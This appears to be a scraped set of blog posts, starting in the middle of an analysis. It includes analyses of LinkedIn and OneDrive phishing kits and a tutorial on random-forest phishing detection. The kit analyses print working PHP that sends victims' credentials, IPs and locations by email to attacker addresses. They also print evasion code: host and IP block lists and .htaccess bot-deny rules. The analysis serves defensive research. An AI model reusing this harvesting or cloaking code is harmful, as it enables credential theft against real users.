\u0026#39;PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt\u0026#39; | base64 -d \u0026lt;html\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; overflow: hidden; } \u0026lt;/style\u0026gt; \u0026lt;ifram% To be honest, I didn\u0026rsquo;t really get the point of encoding some HTML code in base64 and place it in the header, ping me if you have any idea.\nAnyway, here is the rest of index.php:\n\u0026lt;?php $ip = getenv(\u0026#34;REMOTE_ADDR\u0026#34;); $file = fopen(\u0026#34;vu.txt\u0026#34;,\u0026#34;a\u0026#34;); fwrite($file,$ip.\u0026#34; - \u0026#34;.gmdate (\u0026#34;Y-n-d\u0026#34;).\u0026#34; @ \u0026#34;.gmdate (\u0026#34;H:i:s\u0026#34;).\u0026#34;\\n\u0026#34;); Where the IP address of the victim is appended to vu.txt with a timestamp. As we saw while checking the structure of the kit, vu.txt is not created while executing these lines. If we check the content of the file before running index.php, it contains:\n127.0.0.1 - 2017-8-14 @ 20:49:14 127.0.0.1 - 2017-8-14 @ 20:49:48 These information were probably left by the developer of the kit; and gives us an idea about when the kit was created/released.\nHiding techniques Many phishing kits try to hide themselves from bots or web sandbox. In this case, the kit uses 3 techniques:\nrobots.txt .htaccess blocker.php robots.txt This file is used by web developers to give information to web crawlers about the structure of the site. In this case:\nUser-agent: * Disallow: / specifies that every crawler (no matter the User-Agent string) should not navigate in the site. This is commonly used to avoid being indexed by search engines.\n.htaccess .htaccess is a configuration file for Apache Web servers. It can be used to alter the settings, configurations and functionalities of Apache Web servers. In the case of this kit, the file is used to deny access to specific subnets and bots.\nThe .htaccess provided in the kit can be dived in two main parts. The first one uses deny from with a long list of subnets and domain names (almost 6000). Here are some lines:\n[..] deny from 66.235.132.121/22 deny from 66.235.133.14/22 [...] deny from google.com deny from paypal.com [..] Blocked visitors will be shown the error message 403 Forbidden. At the end of this part of the file, allow from all is used to allow access to all the other subnets.\nThe second part is used to block bots, and it uses the following syntax:\n[..] RewriteCond %{HTTP_USER_AGENT} ^HMView [OR] RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR] RewriteCond %{HTTP_USER_AGENT} ^Image\\ Stripper [OR] RewriteCond %{HTTP_USER_AGENT} ^Image\\ Sucker [OR] [..] This part of the file embedded is pasted from an example provided in a tutorial called Blocking offline browsers and \u0026lsquo;bad bots\u0026rsquo;.\nblocker.php Similarly to the previous files, blocker.php is used to prevent some hosts to access the site. It is included in the entry point of the kit and it contains:\n\u0026lt;?php $hostname = gethostbyaddr($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); $blocked_words = array(\u0026#34;above\u0026#34;,\u0026#34;google\u0026#34;,\u0026#34;softlayer\u0026#34;,\u0026#34;amazonaws\u0026#34;, \u0026#34;cyveillance\u0026#34;,\u0026#34;phishtank\u0026#34;, \u0026#34;dreamhost\u0026#34;,\u0026#34;netpilot\u0026#34;,\u0026#34;calyxinstitute\u0026#34;,\u0026#34;tor-exit\u0026#34;, \u0026#34;paypal\u0026#34;); foreach($blocked_words as $word) { if (substr_count($hostname, $word) \u0026gt; 0) { header(\u0026#34;HTTP/1.0 404 Not Found\u0026#34;); die(\u0026#34;\u0026lt;h1\u0026gt;404 Not Found\u0026lt;/h1\u0026gt;The page that you have requested could not be found.\u0026#34;); } } $bannedIP = array(\u0026#34;^66.102.*.*\u0026#34;, \u0026#34;^38.100.*.*\u0026#34;, \u0026#34;^107.170.*.*\u0026#34;...); if(in_array($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;],$bannedIP)) { header(\u0026#39;HTTP/1.0 404 Not Found\u0026#39;); exit(); } else { foreach($bannedIP as $ip) { if(preg_match(\u0026#39;/\u0026#39; . $ip . \u0026#39;/\u0026#39;,$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;])){ header(\u0026#39;HTTP/1.0 404 Not Found\u0026#39;); die(\u0026#34;\u0026lt;h1\u0026gt;404 Not Found\u0026lt;/h1\u0026gt;The page that you have requested could not be found.\u0026#34;); } } } if(strpos($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;google\u0026#39;) or strpos($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;msnbot\u0026#39;) or strpos($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;Yahoo! Slurp\u0026#39;) or [...] ) !== false) { header(\u0026#39;HTTP/1.0 404 Not Found\u0026#39;); exit; } As seen in the code, the access is granted only if hostname, IP address and User-Agent string of the client are not included in a list of harcoded values. A 404 Not Found error is shown otherwise.\nNote that many of the hardcoded values contained in bannedIP and in the User-Agent check were omitted from the lines above to make the code more readable.\nThe phishing page We already saw that index.php redirects the client into the folder with a random name: this contains the same files of the LinkedIn folder found in the kit. The purpose of this trick is to have a different URL for every execution of index.php.\nI didn\u0026rsquo;t find an online instance of the kit, but we can use php to run it locally:\nphp -S localhost:8000 If we go to localhost:8000, the connection will be redirected to a page similar to this:\nLocal deployment of this phishing kit\nYou can see that the URL contains the random md5 string obtained in index.php.\nLet\u0026rsquo;s take a look at the PHP code of the phishing page:\n\u0026lt;?php $emai = $_GET[\u0026#39;user\u0026#39;]; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $geopluginURL=\u0026#39;http://www.geoplugin.net/php.gp?ip=\u0026#39;.$IP; $addrDetailsArr = unserialize(file_get_contents($geopluginURL)); $city = $addrDetailsArr[\u0026#39;geoplugin_city\u0026#39;]; $country = $addrDetailsArr[\u0026#39;geoplugin_countryName\u0026#39;]; if(!$city){ $city=\u0026#39;Not Define\u0026#39;; } if(!$country){ $country=\u0026#39;Not Define\u0026#39;; } In this first part, the IP address and the location information of the client are gathered. Again, we see the use of geoplugin (and again, with the old address geoplugin.net) in order to infer the city and the country from the IP address.\n\u0026lt;?php if($_POST \u0026amp;\u0026amp; isset($_POST[\u0026#39;email\u0026#39;], $_POST[\u0026#39;pass\u0026#39;])){ $ip = isset($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) ? $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] : \u0026#39;\u0026#39;; $email_to = \u0026#34;simon@wmbrep.biz\u0026#34;; $email_subject = \u0026#34;Linked\u0026#34;; $email_from = \u0026#34;simon-walter\u0026#34;; $email = $_POST[\u0026#39;email\u0026#39;]; $pass = $_POST[\u0026#39;pass\u0026#39;]; $cpass = $_POST[\u0026#39;cpass\u0026#39;]; $email_message .= \u0026#34;Email: \u0026#34;.($email). \u0026#34; \\n\u0026#34;; $email_message .= \u0026#34;Password: \u0026#34;.($pass). \u0026#34; \\n\u0026#34;; $email_message .= \u0026#34;IP: \u0026#34;.($ip). \u0026#34; \\n\u0026#34;; $email_message .= \u0026#34;Country: \u0026#34;.($country). \u0026#34; \\n\u0026#34;; $email_message .= \u0026#34;City: \u0026#34;.($city). \u0026#34; \\n\u0026#34;; $headers = \u0026#39;From: \u0026#39;.$email_from.\u0026#34;\\r\\n\u0026#34;; This part of the code defines the options for sending the email. We can see the exfiltration email where all the stolen credentials will be sent (simon@wmbrep.biz), the header of email_from containing simon-walter as well as the subject (Linked) and the message of the email, which - as expected - contains the email address, password, IP address, country and city of the victim.\n\u0026lt;?php if(!$email) { $emailErr = \u0026#34;Please enter your Email\u0026#34;; } elseif(!$email || !preg_match(\u0026#34;/^\\S+@\\S+$/\u0026#34;, $email)) { $emailErr = \u0026#34;Please enter a valid Email\u0026#34;; } elseif(!$pass) { $passErr = \u0026#34;Password is required\u0026#34;; } elseif($pass != $cpass){ $cpassErr = \u0026#34;Both Passwords Must Match\u0026#34;; } else { $gotten = \u0026#34;Login Error,Wrong Email or Password, Try Again\u0026#34;; mail($email_to, $email_subject, $email_message, $headers); } }?\u0026gt; In these last lines, the string contained in the email address input field is checked against a regular expression to determine if it is a valid email address; an error message is shown otherwise. There are also two additional checks for the password (if the password is entered and if it is the same in the Password input field and in the Confirm Password one). The email is then sent as usual with the PHP function mail().\nConclusion In this post we analyzed content.zip: a phishing kit which tricks victims into giving their LinkedIn credentials and pretends to provide a feature to \u0026lsquo;send your business catalogues and quotes via LinkedIn\u0026rsquo;.\nWhile the exfiltration method used is somehow similar to the one we saw in the first episode of this series, this analysis provides interesting findings, especially with the \u0026lsquo;hiding techniques\u0026rsquo; used with: robots.txt, .htaccess and blocker.php.\nEven if the phishing page is always the same, the kit puts it in a new URL at every new visit; so that every victim will have a different URL. The kit also provides logging capabilities for IP address of the victims in vu.txt.\n","permalink":"https://andpalmier.com/posts/phishing-findings-2/","summary":"Analysis of a phishing kit targeting LinkedIn users","title":"Phishing findings, campaign #2: content.zip (LinkedIn)"},{"content":" I started hunting and reporting phishing pages on Twitter, follow me here if you are interested! After some digging, I have decided that it would be interesting to use this topic to refresh my memory around the basics of Machine Learning.\nIntroduction In the last post of this series, we analyzed how some of the parameters of a decision tree could improve the accuracy of the model when classifying phishing sites. In this second post, we will perform a similar analysis, but with a different classifier: random forest.\nA random forest classifier is made of a number of decision trees which operate as an ensemble. The idea behind random forest is simple: every tree in the forest works independently as a classifier; then - based on the task which was submitted - the prediction of the forest is either the average of the predictions of the trees or the one with the most votes.\nRandom forest in action\nRandom forest against phishing We will start the analysis by importing the libraries and the dataset which are going to be used in this post:\nimport numpy as np from matplotlib.legend_handler import HandlerLine2D from sklearn.ensemble import RandomForestClassifier import matplotlib.pyplot as plt # Load the data from a CSV file train_data = np.genfromtxt(\u0026#39;phishing_smaller.csv\u0026#39;, delimiter=\u0026#39;,\u0026#39;, dtype=np.int32) Our dataset contains 10.000 samples and 11 columns, where 10 represent the features and the last one is the label of the sample.\nAs for the previous episode, I used a smaller version of a dataset which was created for this study. You can find the version of the dataset used in this post in this GitHub repository, which contains also information about the features selected and the code of this post in form of a Jupyter notebook.\n# inputs are in all columns except the last one inputs = train_data[:,:-1] # outputs in the last column outputs = train_data[:, -1] StratifiedKFold will be used in order to keep the frequency of the classes constant during our k-fold cross-validation. It is important to note that random_state is set not only for the k-fold validation, but also in the random forest classifier: this will ensure a reproducible setup for all iterations of the model.\nfrom sklearn.model_selection import StratifiedKFold # use 10-fold with random_state set to 0 skf = StratifiedKFold(n_splits=10, random_state=0, shuffle=True) As in the other post, we will use AUC (Area Under Curve) to evaluate the accuracy of our classifier; so let\u0026rsquo;s import the required library and define the array to store the accuracy during the iterations with the different folds:\n# library for evaluating the classifier import sklearn.metrics as metrics # list to store the accuracy during k-fold cross-validation accuracy = np.array([]) We will now loop through the 10 splits and use them to train and evaluate 10 different models. The accuracy of these models will be stored in the accuracy list.\n# loop with splits for train_index, test_index in skf.split(inputs, outputs): # 9 folds used for training x_train, x_test = inputs[train_index], inputs[test_index] # 1 fold for testing y_train, y_test = outputs[train_index], outputs[test_index] # Creates the classifier # random_state is to keep same setup # n_jobs is -1 to use all the processors rf = RandomForestClassifier(random_state=0, n_jobs=-1) # Train the classifier rf.fit(x_train, y_train) # Test the classifier predictions = rf.predict(x_test) false_positives, true_positives, thresholds = \\ metrics.roc_curve(y_test, predictions) # calculate classifier accuracy ROC_AUC = metrics.auc(false_positives, true_positives) accuracy = np.append(accuracy,ROC_AUC) The n_jobs parameter of the classifier defines the number of jobs to run in parallel over the trees. If set to None (which is the case by default) it means 1, while if set to -1 it will use all processors.\nIn order to evaluate our model trained with k-folds, we will take the mean of the accuracy of the 10 values generated in the previous steps:\nprint(f\u0026#34;ROC AUC: {(np.mean(accuracy)}\u0026#34;) \u0026gt; ROC AUC: 0.922092384769539 The accuracy obtained is already quite good. In fact, it is better than the one obtained with the \u0026lsquo;vanilla\u0026rsquo; decision tree. Let\u0026rsquo;s see which parameters could be used to improve the performance of our random forest.\nGetting ready Before continuing with the analysis, considering that some actions are going to be repeated (training, testing and evaluate the classifiers) let\u0026rsquo;s wrap them in a function which will be called in the next paragraphs.\nOur magic function will take in input a list of classifiers and two lists for the results of the training and testing. The lists for the results will be filled with the values of the AUC during the k-fold iterations and will be returned at the end of the function.\n# function which takes as input a list of classifiers # and two lists for the accuracy of the classifiers # these 2 lists will be returned in the end def magic(list_classifiers, list_train_accuracy, list_test_accuracy): # create the folds (always the same with random_state = 0) StratifiedKFold(n_splits=10, random_state=0, shuffle=True) for train_index, test_index in skf.split(inputs, outputs): x_train, x_test = inputs[train_index], inputs[test_index] y_train, y_test = outputs[train_index], outputs[test_index] # iterate through the classifiers for i in range(0,len(list_classifiers)): classifier = list_classifiers[i] classifier.fit(x_train, y_train) # get train accuracy predictions = classifier.predict(x_train) false_positives, true_positives, threshold = \\ metrics.roc_curve(y_train,predictions) ROC_AUC = metrics.auc(false_positives,true_positives) list_train_accuracy[i] = np.append(list_train_accuracy[i],ROC_AUC) # get test accuracy predictions = classifier.predict(x_test) false_positives, true_positives, threshold = \\ metrics.roc_curve(y_test,predictions) ROC_AUC = metrics.auc(false_positives,true_positives) list_test_accuracy[i] = np.append(list_test_accuracy[i],ROC_AUC) # return the array of accuracy of the classifiers return list_train_accuracy,list_test_accuracy Choose the best criterion If you want to see the full list of parameters available to tune the random forest classifier, please refer to the scikit-learn documentation for random forest.\nWe will start our analysis with the criterion parameter, which represents the function that will be used to measure the quality of a split. The supported criteria are gini (for Gini impurity) and entropy (for information gain).\nWe will now create two classifiers having different criterion, to see which one has the best accuracy with our dataset.\n# create the two classifiers gini_classifier = RandomForestClassifier(random_state=0, \\ criterion=\u0026#34;gini\u0026#34;, n_jobs=-1) entropy_classifier = RandomForestClassifier(random_state=0, \\ criterion=\u0026#34;entropy\u0026#34;, n_jobs=-1) # lists to store variables to pass to the \u0026#34;magic\u0026#34; function classifiers = [gini_classifier,entropy_classifier] train_accuracies = [np.array([]),np.array([])] test_accuracies = [np.array([]),np.array([])] # in this iteration we are interested only in the test results _,test_results = magic(classifiers,train_accuracies,test_accuracies) print(f\u0026#34;Accuracy of gini classifier: {(np.mean(test_results[0]))}) print(f\u0026#34;Accuracy of entropy classifier: {(np.mean(test_results[1]))}) \u0026gt; Accuracy of gini classifier: 0.922092384769539 \u0026gt; Accuracy of entropy classifier: 0.9227925851703407 The results listed above shows that, even if the difference is not much (0.07%), the classifier using the entropy function as a criterion for the split outperforms the one using the gini function. It is interesting to note that the gini criterion is the one used by default for decision trees in sklearn.\nTuning: n_estimators Now we are going to tune n_estimators, which represents the total number of trees in the forest. Having a high number of trees usually has the advantage of increasing the overall accuracy of the model, however it will make the training phase slower due to the fact that a higher number of trees needs to be trained. By default, n_estimators is set to 100 (before version 0.22 of sklearn it was 10).\nIn the following example, we will create and evaluate 8 different classifiers having n_estimators set to 1, 3, 6, 10, 25, 50, 75, 100, 125 and 150.\n# number of estimators to use in the 10 classifiers n_estimators = [1,3,6,10,25,50,75,100,125,150] # lists to use for the \u0026#34;magic\u0026#34; function classifiers = [] train_accuracies = [] test_accuracies = [] for i in n_estimators: # create classifier with appropriate n_estimators classifier = RandomForestClassifier(random_state=0, n_jobs=-1, n_estimators=i) classifiers.append(classifier) # metrics to evaluate the classifier train_accuracies.append(np.array([])) test_accuracies.append(np.array([])) # let the magic happen train_results,test_results = magic(classifiers,test_accuracies,train_accuracies) The magic function returned two lists containing the accuracy for every iteration of k-fold for every classifier; now the average of the accuracy for each random forest will be taken, in order to show the results in a chart using matplotlib.\n# store the averages of the classifiers for training and testing avg_train=[] avg_test=[] # loop for every classifier we created for i in range(0,len(train_results)): # average the results for every classifier avg_train.append(np.mean(train_results[i])) avg_test.append(np.mean(test_results[i])) # blue line for train AUC line1, = plt.plot(n_estimators, avg_train, \u0026#39;b\u0026#39;, label=\u0026#34;Train AUC\u0026#34;) # red line for test A=UC line2, = plt.plot(n_estimators, avg_test, \u0026#39;r\u0026#39;, label=\u0026#34;Test AUC\u0026#34;) # print chart plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;n_estimators\u0026#39;) plt.show() Performance of the model when tuning n_estimators\nFor our dataset, the best accuracy in the tests is achieved when using 50 trees (92,29%). If we further increase the number of trees, the AUC in the tests will slightly decrease. The same number of trees allows the classifier to reach the maximum accuracy during training (almost 95%).\nTuning: max_depth max_depth is used to specify the maximum depth of each tree in the forest. As we saw in our previous analysis, the deeper the tree, the more splits it has; thus it will be able to capure more information about the data.\nThe ranges of the max_depth for our analysis will be between 1 and 32. As in the previous paragraph, a line chart will be used to show the results.\n# max depths to use in the classifiers list_max_depth = np.linspace(1, 32, 32, endpoint=True) # lists to use in the magic function classifiers = [] train_accuracies = [] test_accuracies = [] for i in list_max_depth: # create classifier with appropriate max_depth classifier = RandomForestClassifier(random_state=0, n_jobs=-1, max_depth=i) classifiers.append(classifier) # metrics to evaluate the classifier train_accuracies.append(np.array([])) test_accuracies.append(np.array([])) # let the magic happen train_results,test_results = magic(classifiers,test_accuracies,train_accuracies) # store the averages of the classifiers for training and testing avg_training=[] avg_testing=[] for i in range(0,len(train_results)): # average the results for every classifier avg_training.append(np.mean(train_results[i])) avg_testing.append(np.mean(test_results[i])) # blue line for train AUC line1, = plt.plot(list_max_depth, avg_training, \u0026#39;b\u0026#39;, label=\u0026#34;Train AUC\u0026#34;) # red line for test AUC line2, = plt.plot(list_max_depth, avg_testing, \u0026#39;r\u0026#39;, label=\u0026#34;Test AUC\u0026#34;) # print chart plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;max_depths\u0026#39;) plt.show() Performance of the model when tuning max_depth\nIt is interesting to note the spike that is generated when increasing the max_depth of the trees in the forest from 2 to 3: the AUC in training and testing improves of almost 10% (from around 0.8 to almost 0.9).\nAs expected, max_depth contributes to an improvement of the overall accuracy of the model, until around 13, when the test AUC reach its peak. The best AUC during training is reached at 15, and remains stable even when using trees with 32 splits.\nTuning: min_samples_split The next parameter to be tuned is min_samples_split: it represents the minimum number of samples required to split a node in the trees of the forest. This parameter can be an integer (its default value is 2), but also a float: so that ceil(min_samples_split * n_samples) are the minimum number of samples for each split.\nIn this experiment will train and evaluate 10 classifiers having min_samples_split between 0.1 and 1.0.\n# min samples splits from 10% to 100% list_min_samples_splits = np.linspace(0.1,1.0,10,endpoint=True) # lists to use in the magic function classifiers = [] train_accuracies = [] test_accuracies = [] for i in list_min_samples_splits: # create classifier with appropriate max_depth classifier = RandomForestClassifier(random_state=0, n_jobs=-1, \\ min_samples_split=i) classifiers.append(classifier) # metrics to evaluate the classifier train_accuracies.append(np.array([])) test_accuracies.append(np.array([])) # let the magic happen train_results,test_results = magic(classifiers,test_accuracies,train_accuracies) # store the averages of the classifiers for training and testing avg_training=[] avg_testing=[] for i in range(0,len(train_results)): # average the results for every classifier avg_training.append(np.mean(train_results[i])) avg_testing.append(np.mean(test_results[i])) # print chart line1, = plt.plot(list_min_samples_splits, avg_training, \u0026#39;b\u0026#39;, label=\u0026#34;Train AUC\u0026#34;) line2, = plt.plot(list_min_samples_splits, avg_testing, \u0026#39;r\u0026#39;, label=\u0026#34;Test AUC\u0026#34;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;min samples splits\u0026#39;) plt.show() Performance of the model when tuning min_samples_split\nWe can see from the results in the chart that for values of min_samples_split above 0.7, our model does not learn enough information from the data: this is because too many samples are required at each node in order to be splitted. For high values of min_samples_split the performances are equally bad (0.5 of AUC) during train and test.\nTuning: min_samples_leaf Similarly to the previous parameter, min_samples_leaf it is used to specify the minimum number of samples which are required to be in a leaf of the trees in our forest. Again, this parameter can be an integer (also in this case its default value is 2) and a float, so that ceil(min_samples_leaf * n_samples) are the minimum number of samples for each node.\nThe classifiers which are defined in the following lines have min_samples_split between 0.05 and 0.5 (maximum number allowed).\n# min samples leaf from 5% to 50% list_min_samples_leaf = np.linspace(0.05,0.5,10,endpoint=True) # lists to use in the magic function classifiers = [] train_accuracies = [] test_accuracies = [] for i in list_min_samples_leaf: # create classifier with appropriate max_depth classifier = RandomForestClassifier(random_state=0, n_jobs=-1, \\ min_samples_leaf=i) classifiers.append(classifier) # metrics to evaluate the classifier train_accuracies.append(np.array([])) test_accuracies.append(np.array([])) # let the magic happen train_results,test_results = magic(classifiers,test_accuracies,train_accuracies) # store the averages of the classifiers for training and testing avg_training=[] avg_testing=[] for i in range(0,len(train_results)): # average the results for every classifier avg_training.append(np.mean(train_results[i])) avg_testing.append(np.mean(test_results[i])) # print chart line1, = plt.plot(list_min_samples_leaf, avg_training, \u0026#39;b\u0026#39;, label=\u0026#34;Train AUC\u0026#34;) line2, = plt.plot(list_min_samples_leaf, avg_testing, \u0026#39;r\u0026#39;, label=\u0026#34;Test AUC\u0026#34;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;min samples leaf\u0026#39;) plt.show() Performance of the model when tuning min_samples_leaf\nThe results are similar to the previous analysis. Increasing the value of min_samples_leaf cause the model to fail in learning from the data, and decrease its performance to the point of obtaining AUC of 0.5 during train and test when min_samples_leaf is set to more than 0.35.\nTuning: max_features We will conclude this analysis of the random forest classifier with max_features. This parameter represents the number of features which are going to be considered when looking for the best possible split.\nIts default value is None, so that max_features is set to the total number of features. Considering that our dataset has 10 features for every sample, we will train and test 10 classifiers having max_features between 1 and 10.\n# max features from 1 to 10 list_max_features = range(1,11) # lists to use in the magic function classifiers = [] train_accuracies = [] test_accuracies = [] for i in list_max_features: # create classifier with appropriate max_depth classifier = RandomForestClassifier(random_state=0, n_jobs=-1, max_features=i) classifiers.append(classifier) # metrics to evaluate the classifier train_accuracies.append(np.array([])) test_accuracies.append(np.array([])) # let the magic happen train_results,test_results = magic(classifiers,test_accuracies,train_accuracies) # store the averages of the classifiers for training and testing avg_training=[] avg_testing=[] for i in range(0,len(train_results)): # average the results for every classifier avg_training.append(np.mean(train_results[i])) avg_testing.append(np.mean(test_results[i])) # print chart line1, = plt.plot(list_max_features, avg_training, \u0026#39;b\u0026#39;, label=\u0026#34;Train AUC\u0026#34;) line2, = plt.plot(list_max_features, avg_testing, \u0026#39;r\u0026#39;, label=\u0026#34;Test AUC\u0026#34;) plt.legend(handler_map={line1: HandlerLine2D(numpoints=2)}) plt.ylabel(\u0026#39;AUC score\u0026#39;) plt.xlabel(\u0026#39;min samples leaf\u0026#39;) plt.show() Performance of the model when tuning max_features\nThe resulting chart shows that the accuracy of the model does not improve when increasing max_features and it causes an overfitting for all the values in the experiment.\nA similar result was obtained when tuning the same parameter for the decision tree. As stated in the sklearn documentation of random forest classifiers: \u0026rsquo;the search for a split does not stop until at least one valid partition of the node samples is found, even if it requires to effectively inspect more than max_features features\u0026rsquo;.\nConclusion In this post we conducted an experiment to evaluate how some of the parameters available to tune random forest classifiers affect the performance of the model when trying to detect a phishing page. The parameters explored were: criterion, max_depth, min_samples_split, min_samples_leaf and max_features.\nI will mention again that this is not the proper way of tuning the parameters for a random forest: the best approach would be to extend parameters search using RandomizedSearchCV provided by sklearn.\n","permalink":"https://andpalmier.com/posts/ml-with-phishing-ep2/","summary":"Tuning the Random Forest algorithm to detect phishing pages","title":"Machine Learning and phishing, pt. 2: Random Forest"},{"content":" I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.\nLet\u0026rsquo;s start from the beginning Here is my tweet containing some information about this instance of the kit:\n#phishing #onedrive hxxps://www.bonatura.com/ok.co/u/\nexf: macdon161@gmail\nreg: @GoDaddy 🔐 @letsencrypt ☣️ 63.249.146.86 (AS54489)\n🎯 @onedrive @Microsoft @illegalFawn @ActorExpose @PhishKitTracker @Spam404 @malwrhunterteam @JAMESWT_MHT @ANeilan @sysgoblin @PhishStats pic.twitter.com/zbFwmBWEvm\n\u0026mdash; Andrea Palmieri🤌 (@andpalmier) May 22, 2020 We can clearly see from the second screenshot that the zip containing the phishing kit is left exposed, thus we can download it and check it on VirusTotal using the hash of the zip:\n$ sha256sum u.zip c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173 u.zip u.zip on VirusTotal\nExplore the kit When extracting the archive, we can see the following structure:\nu ├── aol.php ├── css │ ├── bootstrap.min.css │ └── style.css ├── emailcode │ └── email.php ├── images │ ├── landing-devices-bg.jpg │ ├── mail.png │ ├── microbg.jpg │ ├── microsoftlogo.png │ ├── mobile-img.png │ ├── officebg.jpg │ ├── officelogo.png │ ├── office.png │ ├── Onedrive-logo.png │ ├── outlook.png │ └── webmaillogo.png ├── index.php ├── js │ └── bootstrap.min.js ├── microsoft.php ├── office.php ├── outlookcode │ └── email.php └── webmail.php I usually start the analysis from the entrypoint: so, in this case, index.php. If we look at the div having the class loginform, we can find an interesting feature of this kit: it gives the user three options to login (Office365, Outlook and \u0026lsquo;other mail\u0026rsquo;).\nHere is how it looks in the code and in the browser:\n\u0026lt;div class=\u0026#34;loginform\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;office.php\u0026#34; class=\u0026#34;loginoffice\u0026#34;\u0026gt;Login with Office 365\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;microsoft.php\u0026#34; class=\u0026#34;loginoutlook\u0026#34;\u0026gt;Login with Outlook\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;webmail.php\u0026#34; class=\u0026#34;loginmail\u0026#34;\u0026gt;Login with Other Mail\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; How this phishing kit looks like when deployed\nExfiltration method The three PHP files referenced from index.php all include emailcode/email.php in the action of the form containing input fields for the credentials. Here is the form in one of them, specifically webmail.php:\n\u0026lt;form name=\u0026#34;webmail\u0026#34; methed=\u0026#34;post\u0026#34; action=\u0026#34;emailcode/email.php\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group orangeclr\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;email\u0026#34;\u0026gt;Email Address\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;input-group mb-2 mr-sm-2 mb-sm-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group-addon\u0026#34; style=\u0026#34;width: 2.6rem\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa fa-at\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;email\u0026#34; placeholder=\u0026#34;you@example.com\u0026#34; required autofocus\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group orangeclr\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;\u0026#34; for=\u0026#34;password\u0026#34;\u0026gt;Password\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;input-group mb-2 mr-sm-2 mb-sm-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group-addon\u0026#34; style=\u0026#34;width: 2.6rem\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa fa-key\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gostepbtn\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit_btn\u0026#34; value=\u0026#34;Go to step 2\u0026#34; class=\u0026#34;gostep\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; After the victim enters the credentials, these are sent to emailcode/email.php with a POST. Let\u0026rsquo;s check what happens in there:\n\u0026lt;?php if(isset($_REQUEST[\u0026#39;submit_btn\u0026#39;])){ $admin_email = \u0026#34;macdon161@gmail.com\u0026#34;; $email = $_REQUEST[\u0026#39;email\u0026#39;]; $password = $_REQUEST[\u0026#39;password\u0026#39;]; $ip = getenv(\u0026#34;REMOTE_ADDR\u0026#34;); $country = ip_visitor_country(); $region = ip_visitor_region(); $city = ip_visitor_city(); $adddate = date(\u0026#34;D M d, Y g:i a\u0026#34;); $browser = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; admin_email contains the exfiltration email address for this instance of the phishing kit. So we can confirm that information is sent directly via email to the address specified in the variable.\nAs it is possible to see in the code above, the email sent includes multiple information: credentials, IP address, date and User-Agent string. The kit also tries to obtain the country, region and city where the request was generated by performing a request to geoplugin.net with curl_init and providing the IP address. However - as of now - the service has moved to geoplugin.com, thus these information cannot currently be collected by the kit.\n\u0026lt;?php // Always set content-type when sending HTML email $formname = $_REQUEST[\u0026#39;logintype\u0026#39;]; switch ($formname) { case \u0026#34;office\u0026#34;: $message .= \u0026#34;Login Type Selection -- Office \\n\u0026#34;; $subject = \u0026#34;Office login attempt -- \u0026#34;.$ip; break; case \u0026#34;outlook\u0026#34;: $message .= \u0026#34;Login Type Selection -- Outlook \\n\u0026#34;; $subject = \u0026#34;Outlook login attempt -- \u0026#34;.$ip; break; case \u0026#34;webmail\u0026#34;: $message .= \u0026#34;Login Type Selection -- Webmail \\n\u0026#34;; $subject = \u0026#34;Webmail login attempt -- \u0026#34;.$ip; break; default: $message .= \u0026#34;Login Type Selection -- other \\n\u0026#34;; $subject = \u0026#34;other login attempt -- \u0026#34;.$ip; } Using a switch, the kit detects which type of credentials were submitted by the phished user, and it changes the message and the subject of the 